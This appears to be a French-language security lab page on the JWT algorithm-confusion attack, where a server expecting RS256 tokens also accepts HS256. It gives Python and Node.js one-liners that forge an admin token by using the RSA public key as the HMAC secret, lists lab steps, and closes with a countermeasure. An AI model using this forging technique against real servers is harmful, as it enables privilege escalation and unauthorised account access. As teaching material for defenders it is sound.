🔐 Scénario 3 — RS256 → HS256 Confusion

Algorithm Confusion Attack

Quand un serveur supporte RS256 (asymétrique), certaines implémentations vulnérables acceptent aussi HS256. L'attaquant signe alors un token avec la clé publique RSA comme secret HMAC.

📚 Le mécanisme de la vulnérabilité

Serveur normal
RS256: vérifie avec clé publique
→
Serveur vulnérable
Accepte HS256: vérifie avec clé publique comme HMAC secret

L'attaquant récupère la clé publique (souvent exposée), signe un token HS256 avec cette clé, et le serveur croit avoir vérifié avec sa propre clé publique RSA !

python3 -c " import jwt public_key = open('public.pem').read() token = jwt.encode({'username':'admin','role':'admin'}, public_key, algorithm='HS256') print(token) "

Étape 1 — Récupérer la clé publique

Le serveur expose sa clé publique RSA (endpoint /scenario3/public-key)

Étape 2 — Se connecter (token normal)

Étape 3 — Forger un token HS256 signé avec la clé publique

En production, utilisez Python ou Node.js localement avec la clé publique récupérée :

node -e " const jwt = require('jsonwebtoken'); const fs = require('fs'); const pubKey = fs.readFileSync('public.pem', 'utf8'); // Signer avec HS256 en utilisant la CLÉ PUBLIQUE comme secret const token = jwt.sign( { username: 'admin', role: 'admin' }, pubKey, { algorithm: 'HS256' } ); console.log(token); "

Étape 4 — Soumettre le token forgé

💡 Contre-mesure : Toujours spécifier l'algorithme attendu : jwt.verify(token, pubKey, { algorithms: ['RS256'] }). Ne jamais laisser le client choisir l'algorithme.
